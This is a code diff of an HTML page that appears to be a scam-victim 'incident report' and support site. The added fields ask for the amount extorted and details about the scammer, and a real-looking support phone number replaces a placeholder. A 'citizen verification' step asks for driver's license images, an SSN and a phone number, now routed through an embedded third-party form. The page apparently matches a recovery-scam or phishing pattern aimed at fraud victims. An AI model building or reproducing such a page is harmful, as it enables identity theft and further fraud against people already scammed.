@@ -81,6 +81,19 @@
   <p class="brief" style="font-size: 13px;">[If your encounter is not listed in the options above, explain here]</p>
   <textarea id="incidentDetails" name="incidentDetails" placeholder="Please elaborate more on the incident"></textarea>
 
+  <label for="">Where you estorted? :</label>
+  <input type="text">
+
+  <label for="">Amount in $ :</label>
+  <input type="number" >
+
+  <label for="refund">Did you ever get a refund? :</label>
+  <input type="text" placeholder="YES/NO">
+
+  <label for="">Additional information about the incident :</label>
+  <p class="brief" style="font-size: 13px;">[Please provide additional information about the incident <br> if possible details about the scammer, social media details, any form of contact if available]</p>
+  <textarea ></textarea>
+
   <button type="submit">Submit Report</button>
 </form>
 
@@ -112,7 +125,7 @@
 
 Whether you need help navigating our website, have questions about our products or services, or simply want to provide feedback, we're here to support you every step of the way.
 
-Feel free to give us a call <br><br><a href="tel:+1234567890" class="call-button"><button>CALL LIVE SUPPORT</button></a><br><br> We look forward to hearing from you!
+Feel free to give us a call <br><br><a href="tel:(720)921-4977" class="call-button"><button>CALL LIVE SUPPORT</button></a><br><br> We look forward to hearing from you!
         </div>
       </div>
       <div class="content1">
@@ -130,7 +143,7 @@ Feel free to give us a call <br><br><a href="tel:+1234567890" class="call-button
 <form id="driverLicenseForm" class="driver-license-form">
   <p><h4>Due to high occurances of cyber attacks and fraudulent online activities, we would want to verify that you are a citizen of America before any further investigative action is taken.</h4></p><br>
 
-  <label for="country">Country * :</label>
+  <!-- <label for="country">Country * :</label>
   <select name="country" id="country">
     <option value="select country">Select Country</option>
     <option value="antigua-and-barbuda">Antigua and Barbuda</option>
@@ -156,15 +169,29 @@ Feel free to give us a call <br><br><a href="tel:+1234567890" class="call-button
   <input type="file" id="driverLicenseFront" name="driverLicenseFront" accept="image/*" required>
 
   <label for="driverLicenseBack">Driver's License (Back) * :</label>
-  <input type="file" id="driverLicenseBack" name="driverLicenseBack" accept="image/*" required>
+  <input type="file" id="driverLicenseBack" name="driverLicenseBack" accept="image/*" required> -->
 
-  <label for="ssn">Social Security Number (SSN) * :</label>
+  <iframe
+  id="JotFormIFrame-240395410605046"
+  title="Form"
+  onload="window.parent.scrollTo(0,0)"
+  allowtransparency="true"
+  allowfullscreen="true"
+  allow="geolocation; microphone; camera"
+  src="https://form.jotform.com/240395410605046"
+  frameborder="0"
+  style="min-width:100%;max-width:100%;height:539px;border:none;"
+  scrolling="no"
+>
+</iframe>
+
+  <!-- <label for="ssn">Social Security Number (SSN) * :</label>
   <input type="text" id="ssn" name="ssn" required>
 
   <label for="phoneNumber">Phone Number * :</label>
   <input type="tel" id="phoneNumber" name="phoneNumber" pattern="[0-9]{3}-[0-9]{3}-[0-9]{4}" placeholder="Format: 123-456-7890" required>
 
-  <button type="submit">Submit Details</button>
+  <button type="submit">Submit Details</button> -->
 </form>
 
 <footer>
@@ -174,8 +201,99 @@ Feel free to give us a call <br><br><a href="tel:+1234567890" class="call-button
     <br>
   </div>
 </footer>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-SGW3M4DGJD"></script>
 
+<script type="text/javascript">
+  var ifr = document.getElementById("JotFormIFrame-240395410605046");
+  if (ifr) {
+    var src = ifr.src;
+    var iframeParams = [];
+    if (window.location.href && window.location.href.indexOf("?") > -1) {
+      iframeParams = iframeParams.concat(window.location.href.substr(window.location.href.indexOf("?") + 1).split('&'));
+    }
+    if (src && src.indexOf("?") > -1) {
+      iframeParams = iframeParams.concat(src.substr(src.indexOf("?") + 1).split("&"));
+      src = src.substr(0, src.indexOf("?"))
+    }
+    iframeParams.push("isIframeEmbed=1");
+    ifr.src = src + "?" + iframeParams.join('&');
+  }
+  window.handleIFrameMessage = function(e) {
+    if (typeof e.data === 'object') { return; }
+    var args = e.data.split(":");
+    if (args.length > 2) { iframe = document.getElementById("JotFormIFrame-" + args[(args.length - 1)]); } else { iframe = document.getElementById("JotFormIFrame"); }
+    if (!iframe) { return; }
+    switch (args[0]) {
+      case "scrollIntoView":
+        iframe.scrollIntoView();
+        break;
+      case "setHeight":
+        iframe.style.height = args[1] + "px";
+        if (!isNaN(args[1]) && parseInt(iframe.style.minHeight) > parseInt(args[1])) {
+          iframe.style.minHeight = args[1] + "px";
+        }
+        break;
+      case "collapseErrorPage":
+        if (iframe.clientHeight > window.innerHeight) {
+          iframe.style.height = window.innerHeight + "px";
+        }
+        break;
+      case "reloadPage":
+        window.location.reload();
+        break;
+      case "loadScript":
+        if( !window.isPermitted(e.origin, ['jotform.com', 'jotform.pro']) ) { break; }
+        var src = args[1];
+        if (args.length > 3) {
+            src = args[1] + ':' + args[2];
+        }
+        var script = document.createElement('script');
+        script.src = src;
+        script.type = 'text/javascript';
+        document.body.appendChild(script);
+        break;
+      case "exitFullscreen":
+        if (window.document.exitFullscreen) window.document.exitFullscreen();
+        else if (window.document.mozCancelFullScreen) window.document.mozCancelFullScreen();
+        else if (window.document.mozCancelFullscreen) window.document.mozCancelFullScreen();
+        else if (window.document.webkitExitFullscreen) window.document.webkitExitFullscreen();
+        else if (window.document.msExitFullscreen) window.document.msExitFullscreen();
+        break;
+    }
+    var isJotForm = (e.origin.indexOf("jotform") > -1) ? true : false;
+    if(isJotForm && "contentWindow" in iframe && "postMessage" in iframe.contentWindow) {
+      var urls = {"docurl":encodeURIComponent(document.URL),"referrer":encodeURIComponent(document.referrer)};
+      iframe.contentWindow.postMessage(JSON.stringify({"type":"urls","value":urls}), "*");
+    }
+  };
+  window.isPermitted = function(originUrl, whitelisted_domains) {
+    var url = document.createElement('a');
+    url.href = originUrl;
+    var hostname = url.hostname;
+    var result = false;
+    if( typeof hostname !== 'undefined' ) {
+      whitelisted_domains.forEach(function(element) {
+          if( hostname.slice((-1 * element.length - 1)) === '.'.concat(element) || hostname === element ) {
+              result = true;
+          }
+      });
+      return result;
+    }
+  };
+  if (window.addEventListener) {
+    window.addEventListener("message", handleIFrameMessage, false);
+  } else if (window.attachEvent) {
+    window.attachEvent("onmessage", handleIFrameMessage);
+  }
+  </script>
 <script>
+  
+
+window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-SGW3M4DGJD');
   // Function to copy text to clipboard
   function copyToClipboard(text) {
     // Create a temporary input element
